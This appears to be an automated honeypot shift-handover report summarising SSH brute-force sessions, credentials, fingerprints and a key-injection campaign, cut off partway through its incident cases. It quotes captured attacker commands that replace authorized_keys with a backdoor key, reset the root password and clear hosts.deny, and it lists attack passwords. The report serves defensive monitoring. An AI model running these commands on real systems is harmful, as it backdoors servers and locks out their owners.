# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-15 |
| **Generated At** | 2026-04-15T22:47:18Z |
| **Shift Time** | 22:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **542** |
| Confirmed Threats | **541** |
| False Positives Filtered | **1** (0.2%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **8** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **511** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **72** |
| Unique Credential Pairs | **45** |
| Unique Usernames | **24** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 14 |
| `user` | 3 |
| `server` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `root04` | 2 |
| `123@QWERTY` | 1 |
| `Passw0rd` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `root` | `root04` | 2 |
| `root` | `123@QWERTY` | 1 |
| `git` | `Passw0rd` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123@QWERTY` | `66.45.231.201` | 2026-04-15T20:56:37 |
| `root` | `3245gs5662d34` | `66.45.231.201` | 2026-04-15T20:56:42 |
| `root` | `Qt123456` | `39.117.79.36` | 2026-04-15T20:57:18 |
| `root` | `3245gs5662d34` | `39.117.79.36` | 2026-04-15T20:57:22 |
| `root` | `Qwerty.1` | `223.244.25.6` | 2026-04-15T20:57:31 |
| `root` | `aaZZ1234` | `66.45.231.201` | 2026-04-15T20:57:59 |
| `root` | `2525` | `119.255.245.44` | 2026-04-15T20:58:17 |
| `root` | `root2026!@#` | `180.76.184.79` | 2026-04-15T21:03:26 |
| `root` | `root04` | `185.216.119.134` | 2026-04-15T22:26:47 |
| `root` | `3245gs5662d34` | `185.216.119.134` | 2026-04-15T22:26:50 |
| `root` | `aaa111222` | `102.88.137.213` | 2026-04-15T22:33:48 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-04-15T22:33:55 |
| `root` | `A123456A:` | `14.103.127.80` | 2026-04-15T22:36:57 |
| `root` | `3245gs5662d34` | `14.103.127.80` | 2026-04-15T22:37:03 |
| `root` | `QwertyQwerty123` | `14.103.127.80` | 2026-04-15T22:37:48 |
| `root` | `root04` | `14.103.127.80` | 2026-04-15T22:38:11 |
| `root` | `Qazwsx2022.` | `102.88.137.213` | 2026-04-15T22:38:32 |
| `root` | `Ab123!@#` | `14.103.127.80` | 2026-04-15T22:40:15 |
| `root` | `QWER@123` | `102.88.137.213` | 2026-04-15T22:41:36 |
| `root` | `Abcd123456#` | `102.88.137.213` | 2026-04-15T22:42:24 |
| `root` | `Balaji@123` | `102.88.137.213` | 2026-04-15T22:44:02 |
| `root` | `qwer12345` | `102.88.137.213` | 2026-04-15T22:44:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **542** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 111 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 97 | 7 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 97 | 7 | Modern SSH client |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Go2Exm1Qzfch"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `119.255.245.44`, `180.76.184.79`, `223.244.25.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.127.80`, `185.216.119.134`, `66.45.231.201`, `102.88.137.213`, `39.117.79.36`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **14** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS29465` | MTN NIGERIA Communication limited | 1 | HIGH |
| `AS149178` | China Telecom | 1 | HIGH |
| `AS55933` | Cloudie Limited | 1 | HIGH |
| `AS138423` | CMPak Limited | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | HIGH |
| `AS15704` | XTRA TELECOM S.A. | 1 | MEDIUM |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-dcb7cd45e988

| Field | Detail |
|---|---|
| **Source IP** | `66.45.231[.]201` |
| **First Seen** | 2026-04-15 20:56 |
| **Last Seen** | 2026-04-15 20:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:56:36` | `cowrie.session.connect` |
| `2026-04-15 20:56:36` | `cowrie.client.version` |
| `2026-04-15 20:56:36` | `cowrie.client.kex` |
| `2026-04-15 20:56:37` | `cowrie.login.success` |
| `2026-04-15 20:56:38` | `cowrie.session.params` |
| `2026-04-15 20:56:38` | `cowrie.command.input` |
| `2026-04-15 20:56:38` | `cowrie.command.failed` |
| `2026-04-15 20:56:38` | `cowrie.log.closed` |
| `2026-04-15 20:56:38` | `cowrie.session.params` |
| `2026-04-15 20:56:38` | `cowrie.command.input` |
| `2026-04-15 20:56:39` | `cowrie.session.file_download` |
| `2026-04-15 20:56:39` | `cowrie.log.closed` |
| `2026-04-15 20:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.231[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.231[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b613ade8e5f7

| Field | Detail |
|---|---|
| **Source IP** | `66.45.231[.]201` |
| **First Seen** | 2026-04-15 20:56 |
| **Last Seen** | 2026-04-15 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:56:41` | `cowrie.session.connect` |
| `2026-04-15 20:56:41` | `cowrie.client.version` |
| `2026-04-15 20:56:42` | `cowrie.client.kex` |
| `2026-04-15 20:56:42` | `cowrie.login.success` |
| `2026-04-15 20:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.231[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.231[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d885e1bc34d3

| Field | Detail |
|---|---|
| **Source IP** | `39.117.79[.]36` |
| **First Seen** | 2026-04-15 20:57 |
| **Last Seen** | 2026-04-15 20:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:57:18` | `cowrie.session.connect` |
| `2026-04-15 20:57:18` | `cowrie.client.version` |
| `2026-04-15 20:57:18` | `cowrie.client.kex` |
| `2026-04-15 20:57:18` | `cowrie.login.success` |
| `2026-04-15 20:57:19` | `cowrie.session.params` |
| `2026-04-15 20:57:19` | `cowrie.command.input` |
| `2026-04-15 20:57:19` | `cowrie.command.failed` |
| `2026-04-15 20:57:19` | `cowrie.log.closed` |
| `2026-04-15 20:57:19` | `cowrie.session.params` |
| `2026-04-15 20:57:19` | `cowrie.command.input` |
| `2026-04-15 20:57:19` | `cowrie.session.file_download` |
| `2026-04-15 20:57:19` | `cowrie.log.closed` |
| `2026-04-15 20:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.117.79[.]36` to AbuseIPDB if not already reported
- [ ] Block `39.117.79[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb6746500c2

| Field | Detail |
|---|---|
| **Source IP** | `39.117.79[.]36` |
| **First Seen** | 2026-04-15 20:57 |
| **Last Seen** | 2026-04-15 20:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:57:21` | `cowrie.session.connect` |
| `2026-04-15 20:57:21` | `cowrie.client.version` |
| `2026-04-15 20:57:21` | `cowrie.client.kex` |
| `2026-04-15 20:57:22` | `cowrie.login.success` |
| `2026-04-15 20:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.117.79[.]36` to AbuseIPDB if not already reported
- [ ] Block `39.117.79[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d48a4b51c23

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-15 20:57 |
| **Last Seen** | 2026-04-15 20:58 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Go2Exm1Qzfch"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:57:29` | `cowrie.session.connect` |
| `2026-04-15 20:57:29` | `cowrie.client.version` |
| `2026-04-15 20:57:29` | `cowrie.client.kex` |
| `2026-04-15 20:57:31` | `cowrie.login.success` |
| `2026-04-15 20:57:33` | `cowrie.session.params` |
| `2026-04-15 20:57:33` | `cowrie.command.input` |
| `2026-04-15 20:57:33` | `cowrie.command.failed` |
| `2026-04-15 20:57:34` | `cowrie.log.closed` |
| `2026-04-15 20:57:35` | `cowrie.session.params` |
| `2026-04-15 20:57:35` | `cowrie.command.input` |
| `2026-04-15 20:57:36` | `cowrie.session.file_download` |
| `2026-04-15 20:57:36` | `cowrie.log.closed` |
| `2026-04-15 20:57:49` | `cowrie.session.params` |
| `2026-04-15 20:57:49` | `cowrie.command.input` |
| `2026-04-15 20:57:49` | `cowrie.log.closed` |
| `2026-04-15 20:57:49` | `cowrie.session.params` |
| `2026-04-15 20:57:49` | `cowrie.command.input` |
| `2026-04-15 20:57:50` | `cowrie.log.closed` |
| `2026-04-15 20:57:50` | `cowrie.session.params` |
| `2026-04-15 20:57:50` | `cowrie.command.input` |
| `2026-04-15 20:57:50` | `cowrie.session.file_download` |
| `2026-04-15 20:57:50` | `cowrie.log.closed` |
| `2026-04-15 20:57:51` | `cowrie.session.params` |
| `2026-04-15 20:57:51` | `cowrie.command.input` |
| `2026-04-15 20:57:51` | `cowrie.log.closed` |
| `2026-04-15 20:57:52` | `cowrie.session.params` |
| `2026-04-15 20:57:52` | `cowrie.command.input` |
| `2026-04-15 20:57:52` | `cowrie.log.closed` |
| `2026-04-15 20:57:53` | `cowrie.session.params` |
| `2026-04-15 20:57:53` | `cowrie.command.input` |
| `2026-04-15 20:57:53` | `cowrie.command.input` |
| `2026-04-15 20:57:54` | `cowrie.log.closed` |
| `2026-04-15 20:57:54` | `cowrie.session.params` |
| `2026-04-15 20:57:54` | `cowrie.command.input` |
| `2026-04-15 20:57:55` | `cowrie.log.closed` |
| `2026-04-15 20:57:55` | `cowrie.session.params` |
| `2026-04-15 20:57:55` | `cowrie.command.input` |
| `2026-04-15 20:57:55` | `cowrie.log.closed` |
| `2026-04-15 20:57:56` | `cowrie.session.params` |
| `2026-04-15 20:57:56` | `cowrie.command.input` |
| `2026-04-15 20:57:56` | `cowrie.log.closed` |
| `2026-04-15 20:57:56` | `cowrie.session.params` |
| `2026-04-15 20:57:56` | `cowrie.command.input` |
| `2026-04-15 20:57:57` | `cowrie.log.closed` |
| `2026-04-15 20:57:58` | `cowrie.session.params` |
| `2026-04-15 20:57:58` | `cowrie.command.input` |
| `2026-04-15 20:57:59` | `cowrie.log.closed` |
| `2026-04-15 20:57:59` | `cowrie.session.params` |
| `2026-04-15 20:57:59` | `cowrie.command.input` |
| `2026-04-15 20:57:59` | `cowrie.log.closed` |
| `2026-04-15 20:58:00` | `cowrie.session.params` |
| `2026-04-15 20:58:00` | `cowrie.command.input` |
| `2026-04-15 20:58:00` | `cowrie.log.closed` |
| `2026-04-15 20:58:01` | `cowrie.session.params` |
| `2026-04-15 20:58:01` | `cowrie.command.input` |
| `2026-04-15 20:58:02` | `cowrie.log.closed` |
| `2026-04-15 20:58:02` | `cowrie.session.params` |
| `2026-04-15 20:58:02` | `cowrie.command.input` |
| `2026-04-15 20:58:02` | `cowrie.log.closed` |
| `2026-04-15 20:58:03` | `cowrie.session.params` |
| `2026-04-15 20:58:03` | `cowrie.command.input` |
| `2026-04-15 20:58:03` | `cowrie.log.closed` |
| `2026-04-15 20:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-459b2ac24c83

| Field | Detail |
|---|---|
| **Source IP** | `66.45.231[.]201` |
| **First Seen** | 2026-04-15 20:57 |
| **Last Seen** | 2026-04-15 20:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:57:58` | `cowrie.session.connect` |
| `2026-04-15 20:57:58` | `cowrie.client.version` |
| `2026-04-15 20:57:58` | `cowrie.client.kex` |
| `2026-04-15 20:57:59` | `cowrie.login.success` |
| `2026-04-15 20:57:59` | `cowrie.session.params` |
| `2026-04-15 20:57:59` | `cowrie.command.input` |
| `2026-04-15 20:57:59` | `cowrie.command.failed` |
| `2026-04-15 20:58:00` | `cowrie.log.closed` |
| `2026-04-15 20:58:00` | `cowrie.session.params` |
| `2026-04-15 20:58:00` | `cowrie.command.input` |
| `2026-04-15 20:58:00` | `cowrie.session.file_download` |
| `2026-04-15 20:58:00` | `cowrie.log.closed` |
| `2026-04-15 20:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.231[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.231[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04a1c05dbe8b

| Field | Detail |
|---|---|
| **Source IP** | `66.45.231[.]201` |
| **First Seen** | 2026-04-15 20:58 |
| **Last Seen** | 2026-04-15 20:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:58:03` | `cowrie.session.connect` |
| `2026-04-15 20:58:03` | `cowrie.client.version` |
| `2026-04-15 20:58:03` | `cowrie.client.kex` |
| `2026-04-15 20:58:04` | `cowrie.login.success` |
| `2026-04-15 20:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.231[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.231[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c17d2ad29722

| Field | Detail |
|---|---|
| **Source IP** | `119.255.245[.]44` |
| **First Seen** | 2026-04-15 20:58 |
| **Last Seen** | 2026-04-15 20:58 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TKjoGim3RGLY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:58:16` | `cowrie.session.connect` |
| `2026-04-15 20:58:16` | `cowrie.client.version` |
| `2026-04-15 20:58:16` | `cowrie.client.kex` |
| `2026-04-15 20:58:17` | `cowrie.login.success` |
| `2026-04-15 20:58:17` | `cowrie.session.params` |
| `2026-04-15 20:58:17` | `cowrie.command.input` |
| `2026-04-15 20:58:17` | `cowrie.command.failed` |
| `2026-04-15 20:58:17` | `cowrie.log.closed` |
| `2026-04-15 20:58:17` | `cowrie.session.params` |
| `2026-04-15 20:58:17` | `cowrie.command.input` |
| `2026-04-15 20:58:17` | `cowrie.session.file_download` |
| `2026-04-15 20:58:17` | `cowrie.log.closed` |
| `2026-04-15 20:58:30` | `cowrie.session.params` |
| `2026-04-15 20:58:30` | `cowrie.command.input` |
| `2026-04-15 20:58:30` | `cowrie.log.closed` |
| `2026-04-15 20:58:30` | `cowrie.session.params` |
| `2026-04-15 20:58:30` | `cowrie.command.input` |
| `2026-04-15 20:58:30` | `cowrie.log.closed` |
| `2026-04-15 20:58:31` | `cowrie.session.params` |
| `2026-04-15 20:58:31` | `cowrie.command.input` |
| `2026-04-15 20:58:31` | `cowrie.session.file_download` |
| `2026-04-15 20:58:31` | `cowrie.log.closed` |
| `2026-04-15 20:58:31` | `cowrie.session.params` |
| `2026-04-15 20:58:31` | `cowrie.command.input` |
| `2026-04-15 20:58:31` | `cowrie.log.closed` |
| `2026-04-15 20:58:32` | `cowrie.session.params` |
| `2026-04-15 20:58:32` | `cowrie.command.input` |
| `2026-04-15 20:58:32` | `cowrie.log.closed` |
| `2026-04-15 20:58:32` | `cowrie.session.params` |
| `2026-04-15 20:58:32` | `cowrie.command.input` |
| `2026-04-15 20:58:32` | `cowrie.command.input` |
| `2026-04-15 20:58:32` | `cowrie.log.closed` |
| `2026-04-15 20:58:33` | `cowrie.session.params` |
| `2026-04-15 20:58:33` | `cowrie.command.input` |
| `2026-04-15 20:58:33` | `cowrie.log.closed` |
| `2026-04-15 20:58:33` | `cowrie.session.params` |
| `2026-04-15 20:58:33` | `cowrie.command.input` |
| `2026-04-15 20:58:33` | `cowrie.log.closed` |
| `2026-04-15 20:58:34` | `cowrie.session.params` |
| `2026-04-15 20:58:34` | `cowrie.command.input` |
| `2026-04-15 20:58:34` | `cowrie.log.closed` |
| `2026-04-15 20:58:34` | `cowrie.session.params` |
| `2026-04-15 20:58:34` | `cowrie.command.input` |
| `2026-04-15 20:58:34` | `cowrie.log.closed` |
| `2026-04-15 20:58:34` | `cowrie.session.params` |
| `2026-04-15 20:58:34` | `cowrie.command.input` |
| `2026-04-15 20:58:35` | `cowrie.log.closed` |
| `2026-04-15 20:58:35` | `cowrie.session.params` |
| `2026-04-15 20:58:35` | `cowrie.command.input` |
| `2026-04-15 20:58:35` | `cowrie.log.closed` |
| `2026-04-15 20:58:35` | `cowrie.session.params` |
| `2026-04-15 20:58:35` | `cowrie.command.input` |
| `2026-04-15 20:58:36` | `cowrie.log.closed` |
